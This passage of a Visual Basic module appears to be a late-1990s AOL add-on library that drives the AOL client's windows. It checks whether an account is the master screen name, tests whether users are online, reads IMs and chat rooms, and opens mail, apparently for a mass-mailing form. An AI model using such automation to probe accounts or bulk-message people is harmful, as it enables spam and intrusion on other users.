    Dim AOL As Long, MDI As Long, pWindow As Long
    Dim pButton As Long, Modal As Long, mStatic As Long
    Dim mString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Call Keyword("aol://4344:1580.prntcon.12263709.564517913")
    Do
        DoEvents
        pWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Parental Controls")
        pButton& = FindWindowEx(pWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until pWindow& <> 0& And pButton& <> 0&
    Pause 0.3
    Do
        DoEvents
        Call PostMessage(pButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call PostMessage(pButton&, WM_LBUTTONUP, 0&, 0&)
        Pause 0.8
        Modal& = FindWindow("_AOL_Modal", vbNullString)
        mStatic& = FindWindowEx(Modal&, 0&, "_AOL_Static", vbNullString)
        mString$ = GetText(mStatic&)
    Loop Until Modal& <> 0 And mStatic& <> 0& And mString$ <> ""
    mString$ = ReplaceString(mString$, Chr(10), "")
    mString$ = ReplaceString(mString$, Chr(13), "")
    If mString$ = "Set Parental Controls" Then
        CheckIfMaster = True
    Else
        CheckIfMaster = False
    End If
    Call PostMessage(Modal&, WM_CLOSE, 0&, 0&)
    DoEvents
    Call PostMessage(pWindow&, WM_CLOSE, 0&, 0&)
End Function
Public Function CheckIMs(person As String) As Boolean
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim Available As Long, Available1 As Long, Available2 As Long
    Dim Available3 As Long, oWindow As Long, oButton As Long
    Dim oStatic As Long, oString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call Keyword("aol://9293:" & person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        Available1& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        Available2& = FindWindowEx(im&, Available1&, "_AOL_Icon", vbNullString)
        Available3& = FindWindowEx(im&, Available2&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available3&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich <> 0& And Available& <> 0& And Available& <> Available1& And Available& <> Available2& And Available& <> Available3&
    DoEvents
    Call SendMessage(Available&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Available&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        oWindow& = FindWindow("#32770", "America Online")
        oButton& = FindWindowEx(oWindow&, 0&, "Button", "OK")
    Loop Until oWindow& <> 0& And oButton& <> 0&
    Do
        DoEvents
        oStatic& = FindWindowEx(oWindow&, 0&, "Static", vbNullString)
        oStatic& = FindWindowEx(oWindow&, oStatic&, "Static", vbNullString)
        oString$ = GetText(oStatic)
    Loop Until oStatic& <> 0& And Len(oString$) > 15
    If InStr(oString$, "is online and able to receive") <> 0 Then
        CheckIMs = True
    Else
        CheckIMs = False
    End If
    Call SendMessage(oButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(oButton&, WM_KEYUP, VK_SPACE, 0&)
    Call PostMessage(im&, WM_CLOSE, 0&, 0&)
End Function
Public Sub CloseOpenMails()
    Dim OpenSend As Long, OpenForward As Long
    Do
        DoEvents
        OpenSend& = FindSendWindow
        OpenForward& = FindForwardWindow
        Call PostMessage(OpenSend&, WM_CLOSE, 0&, 0&)
        DoEvents
        Call PostMessage(OpenForward&, WM_CLOSE, 0&, 0&)
        DoEvents
    Loop Until OpenSend& = 0 And OpenForward& = 0
End Sub

Public Sub CloseWindow(Window As Long)
    Call PostMessage(Window&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub Button(mButton As Long)
    Call SendMessage(mButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(mButton&, WM_KEYUP, VK_SPACE, 0&)
End Sub


Public Function FileGetAttributes(TheFile As String) As Integer
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        FileGetAttributes% = GetAttr(TheFile$)
    End If
End Function

Public Sub FileSetNormal(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbNormal
    End If
End Sub

Public Sub FileSetReadOnly(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbReadOnly
    End If
End Sub

Public Sub FileSetHidden(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbHidden
    End If
End Sub
Sub Common_Load(List1 As ListBox)
Dim A As Variant
Dim b As Variant
mmer.CmDialog1.DialogTitle = "Load Tru Magic List File" ' set title
mmer.CmDialog1.Filter = "Tru screen name list (*.txt)|*.txt|All Files (*.*)|*.*|"
mmer.CmDialog1.flags = &H1000&
mmer.CmDialog1.Action = 1
A = 1
If (mmer.CmDialog1.FileTitle <> "") Then
mmer.List1.Clear ' clear the list
Open mmer.CmDialog1.FileTitle For Input As A
While (EOF(A) = False)
Line Input #A, b
mmer.List1.AddItem b
mmer.Label2.Caption = mmer.Label2.Caption + 1
Wend
Close A
End If
End Sub

Sub Common_Save(List1 As ListBox)
Dim b As Variant
mmer.CmDialog1.DialogTitle = "Save Tru Magic List File" ' set CMDialog's title bar
mmer.CmDialog1.Filter = "Tru screen name list (*.txt)|*.txt|All Files (*.*)|*.*|"
mmer.CmDialog1.flags = &H1000&
mmer.CmDialog1.Action = 2
If (mmer.CmDialog1.FileTitle <> "") Then
A = 2
Open mmer.CmDialog1.FileName For Output As A
b = 0
Do While b < mmer.List1.ListCount
Print #A, mmer.List1.List(b)
b = b + 1
Loop
Close A
End If
End Sub
Sub WriteINI(sAppname$, sKeyName$, sNewString$, sFileName$)
'Example: WriteINI("DaProggy", "Lamers Name", text3.text, app.path + "\Prog.ini")
Dim r As Integer
    r = WritePrivateProfileString(sAppname, sKeyName, sNewString, sFileName)
End Sub
Function GetFromINI(AppName$, KeyName$, FileName$) As String
   Dim RetStr As String
   RetStr = String(255, Chr(0))
   GetFromINI = Left(RetStr, GetPrivateProfileString(AppName$, ByVal KeyName$, "", RetStr, Len(RetStr), FileName$))
End Function

Public Function FindIM() As Long
    Dim AOL As Long, MDI As Long, child As Long, Caption As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Caption$ = GetCaption(child&)
    If InStr(Caption$, "Instant Message") = 1 Or InStr(Caption$, "Instant Message") = 2 Or InStr(Caption$, "Instant Message") = 3 Then
        FindIM& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Caption$ = GetCaption(child&)
            If InStr(Caption$, "Instant Message") = 1 Or InStr(Caption$, "Instant Message") = 2 Or InStr(Caption$, "Instant Message") = 3 Then
                FindIM& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindIM& = child&
End Function

Public Function FindRoom() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim Rich As Long, AOLList As Long
    Dim AOLIcon As Long, AOLStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
    AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
    AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
        FindRoom& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
            AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
            AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
                FindRoom& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindRoom& = child&
End Function

Public Function FindInfoWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim AOLCheck As Long, AOLIcon As Long, AOLStatic As Long
    Dim AOLIcon2 As Long, AOLGlyph As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
    AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
    AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AOLIcon2& = FindWindowEx(child&, AOLIcon&, "_AOL_Icon", vbNullString)
    If AOLCheck& <> 0& And AOLStatic& <> 0& And AOLGlyph& <> 0& And AOLIcon& <> 0& And AOLIcon2& <> 0& Then
        FindInfoWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
            AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
            AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AOLIcon2& = FindWindowEx(child&, AOLIcon&, "_AOL_Icon", vbNullString)
            If AOLCheck& <> 0& And AOLStatic& <> 0& And AOLGlyph& <> 0& And AOLIcon& <> 0& And AOLIcon2& <> 0& Then
                FindInfoWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindInfoWindow& = child&
End Function

Public Function RoomCount() As Long
    Dim AOL As Long, MDI As Long, rMail As Long, rList As Long
    Dim Count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    rMail& = FindRoom
    rList& = FindWindowEx(rMail&, 0&, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(rList&, LB_GETCOUNT, 0&, 0&)
    RoomCount& = Count&
End Function

Public Function FindSendWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim SendStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    SendStatic& = FindWindowEx(child&, 0&, "_AOL_Static", "Send Now")
    If SendStatic& <> 0& Then
        FindSendWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            SendStatic& = FindWindowEx(child&, 0&, "_AOL_Static", "Send Now")
            If SendStatic& <> 0& Then
                FindSendWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindSendWindow& = 0&
End Function
Public Sub FormDrag(TheForm As Form)
    Call ReleaseCapture
    Call SendMessage(TheForm.hWnd, WM_SYSCOMMAND, WM_MOVE, 0)
End Sub
Public Function GetListText(WindowHandle As Long) As String
    Dim Buffer As String, TextLength As Long
    TextLength& = SendMessage(WindowHandle&, LB_GETTEXTLEN, 0&, 0&)
    Buffer$ = String(TextLength&, 0&)
    Call SendMessageByString(WindowHandle&, LB_GETTEXT, TextLength& + 1, Buffer$)
    GetListText$ = Buffer$
End Function
Public Sub IMIgnore(person As String)
    Call Instantmessage("$IM_OFF, " & person$, "=)")
End Sub

Public Sub IMUnIgnore(person As String)
    Call Instantmessage("$IM_ON, " & person$, "=)")
End Sub

Public Sub IMsOff()
Call Instantmessage("$IM_OFF", " ")
End Sub

Public Sub IMsOn()
Call Instantmessage("$IM_ON", " ")
End Sub

Public Function IMSender() As String
    Dim im As Long, Caption As String
    Caption$ = GetCaption(FindIM&)
    If InStr(Caption$, ":") = 0& Then
        IMSender$ = ""
        Exit Function
    Else
        IMSender$ = Right(Caption$, Len(Caption$) - InStr(Caption$, ":") - 1)
    End If
End Function

Public Function IMText() As String
    Dim Rich As Long
    Rich& = FindWindowEx(FindIM&, 0&, "RICHCNTL", vbNullString)
    IMText$ = GetText(Rich&)
End Function

Public Function IMLastMsg() As String
    Dim Rich As Long, MsgString As String, Spot As Long
    Dim NewSpot As Long
    Rich& = FindWindowEx(FindIM&, 0&, "RICHCNTL", vbNullString)
    MsgString$ = GetText(Rich&)
    NewSpot& = InStr(MsgString$, Chr(9))
    Do
        Spot& = NewSpot&
        NewSpot& = InStr(Spot& + 1, MsgString$, Chr(9))
    Loop Until NewSpot& <= 0&
    MsgString$ = Right(MsgString$, Len(MsgString$) - Spot& - 1)
    IMLastMsg$ = Left(MsgString$, Len(MsgString$) - 1)
End Function

Public Sub IMRespond(Msg As String)
    Dim im As Long, Rich As Long, icon As Long
    im& = FindIM&
    If im& = 0& Then Exit Sub
    Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
    Rich& = FindWindowEx(im&, Rich&, "RICHCNTL", vbNullString)
    icon& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, Msg$)
    DoEvents
    Call SendMessage(icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(icon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub Load2listboxes(Directory As String, ListA As ListBox, ListB As ListBox)
    Dim MyString As String, aString As String, bString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        aString$ = Left(MyString$, InStr(MyString$, "*") - 1)
        bString$ = Right(MyString$, Len(MyString$) - InStr(MyString$, "*"))
        DoEvents
        ListA.AddItem aString$
        ListB.AddItem bString$
    Wend
    Close #1
End Sub

Public Sub SaveListBox(Directory As String, TheList As ListBox)
    Dim SaveList As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveList& = 0 To TheList.ListCount - 1
        Print #1, TheList.List(SaveList&)
    Next SaveList&
    Close #1
End Sub

Public Sub Save2ListBoxes(Directory As String, ListA As ListBox, ListB As ListBox)
    Dim SaveLists As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveLists& = 0 To ListA.ListCount - 1
        Print #1, ListA.List(SaveLists&) & "*" & ListB.List(SaveLists)
    Next SaveLists&
    Close #1
End Sub

Public Sub SaveComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim SaveCombo As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveCombo& = 0 To Combo.ListCount - 1
        Print #1, Combo.List(SaveCombo&)
    Next SaveCombo&
    Close #1
End Sub

Public Sub LoadComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        Combo.AddItem MyString$
    Wend
    Close #1
End Sub
Public Sub Loadlistbox(Directory As String, TheList As ListBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        TheList.AddItem MyString$
    Wend
    Close #1
End Sub
Sub LoadText(txtLoad As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    Open Path$ For Input As #1
    TextString$ = Input(LOF(1), #1)
    Close #1
    txtLoad.text = TextString$
End Sub

Sub SaveText(txtSave As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    TextString$ = txtSave.text
    Open Path$ For Output As #1
    Print #1, TextString$
    Close #1
End Sub
Public Function SwitchStrings(MyString As String, String1 As String, String2 As String) As String
    Dim TempString As String, Spot1 As Long, Spot2 As Long
    Dim Spot As Long, ToFind As String, ReplaceWith As String
    Dim NewSpot As Long, LeftString As String, RightString As String
    Dim NewString As String
    If Len(String2) > Len(String1) Then
        TempString$ = String1$
        String1$ = String2$
        String2$ = TempString$
    End If
    Spot1& = InStr(MyString$, String1$)
    Spot2& = InStr(MyString$, String2$)
    If Spot1& = 0& And Spot2& = 0& Then
        SwitchStrings$ = MyString$
        Exit Function
    End If
    If Spot1& < Spot2& Or Spot2& = 0 Or Len(String1$) = Len(String2$) Then
        If Spot1& > 0 Then
            Spot& = Spot1&
            ToFind$ = String1$
            ReplaceWith$ = String2$
        End If
    End If
    If Spot2& < Spot1& Or Spot1& = 0& Then
        If Spot2& > 0& Then
            Spot& = Spot2&
            ToFind$ = String2$
            ReplaceWith$ = String1$
        End If
    End If
    If Spot1& = 0& And Spot2& = 0& Then
        SwitchStrings$ = MyString$
        Exit Function
    End If
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString$ = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot + Len(ReplaceWith$) - Len(ToFind$) + 1
        If Spot& <> 0& Then
            Spot1& = InStr(Spot&, MyString$, String1$)
            Spot2& = InStr(Spot&, MyString$, String2$)
        End If
        If Spot1& = 0& And Spot2& = 0& Then
            SwitchStrings$ = MyString$
            Exit Function
        End If
        If Spot1& < Spot2& Or Spot2& = 0& Or Len(String1$) = Len(String2$) Then
            If Spot1& > 0& Then
                Spot& = Spot1&
                ToFind$ = String1$
                ReplaceWith$ = String2$
            End If
        End If
        If Spot2& < Spot1& Or Spot1& = 0& Then
            If Spot2& > 0& Then
                Spot& = Spot2&
                ToFind$ = String2$
                ReplaceWith$ = String1$
            End If
        End If
        If Spot1& = 0& And Spot2& = 0& Then
            Spot& = 0&
        End If
        If Spot& > 0& Then
            NewSpot& = InStr(Spot&, MyString$, ToFind$)
        Else
            NewSpot& = Spot&
        End If
    Loop Until NewSpot& < 1&
    SwitchStrings$ = NewString$
End Function



Public Sub MailOpenFlash()
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RIGHT, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RIGHT, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub

Public Sub MailOpenNew()
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, sMod As Long, CurPos As POINTAPI
    Dim WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub

Public Sub MailOpenOld()
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 4
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub

Public Sub MailOpenSent()
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 5
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub

Public Sub MailOpenEmailFlash(Index As Long)
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < Index& Then Exit Sub
    Call SendMessage(fList&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(fList&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(fList&, WM_KEYUP, VK_RETURN, 0&)
End Sub

Public Sub MailOpenEmailNew(Index)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < Index Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, Index, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub

Public Sub MailOpenEmailOld(Index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < Index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub

Public Sub MailOpenEmailSent(Index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < Index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub

Public Function MailCountFlash() As Long
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim Count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    MailCountFlash& = Count&
End Function

Public Sub MailToListFlash(TheList As ListBox)
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim Count As Long, MyString As String, AddMails As Long
    Dim sLength As Long, Spot As Long
